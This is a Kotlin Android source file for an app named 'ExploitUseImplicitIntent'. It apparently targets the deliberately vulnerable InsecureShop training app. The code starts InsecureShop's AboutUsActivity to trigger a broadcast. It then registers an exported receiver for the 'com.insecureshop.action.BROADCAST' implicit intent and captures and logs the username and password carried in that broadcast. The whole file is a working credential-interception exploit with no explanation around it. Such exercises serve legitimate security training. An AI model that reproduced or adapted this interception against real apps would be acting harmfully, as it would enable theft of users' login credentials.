package com.example.exploituseimplicitintent

import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview
import com.example.exploituseimplicitintent.ui.theme.ExploitUseImplicitIntentTheme

class MainActivity : AppCompatActivity() {
    @SuppressLint("UnspecifiedRegisterReceiverFlag")
    @Override
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        try {
            val triggerBroadCast: Intent = Intent()
            triggerBroadCast.setClassName("com.insecureshop", "com.insecureshop.AboutUsActivity")
            startActivity(triggerBroadCast)
        } catch (e: Exception) {
            Log.e("MainActivity", "Failed to start AboutUsActivity", e)
        }
        val receiver: BroadcastReceiver = object : BroadcastReceiver() {
            @Override
            override // Once a broadcast received with a specific intent
            fun onReceive(context: Context?, intent: Intent) {
                // Geting the value from the defined extras
                val username: String = intent.getStringExtra("username").toString()
                val password: String = intent.getStringExtra("password").toString()
                Log.d("userName: ", username)
                Log.d("password: ", password)
            }
        }
        // Waiting for any broadcast with this intent "com.insecureshop.action.BROADCAST"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            registerReceiver(receiver, IntentFilter("com.insecureshop.action.BROADCAST"), RECEIVER_EXPORTED)
        } else {
            registerReceiver(receiver, IntentFilter("com.insecureshop.action.BROADCAST"))
        }
    }
}

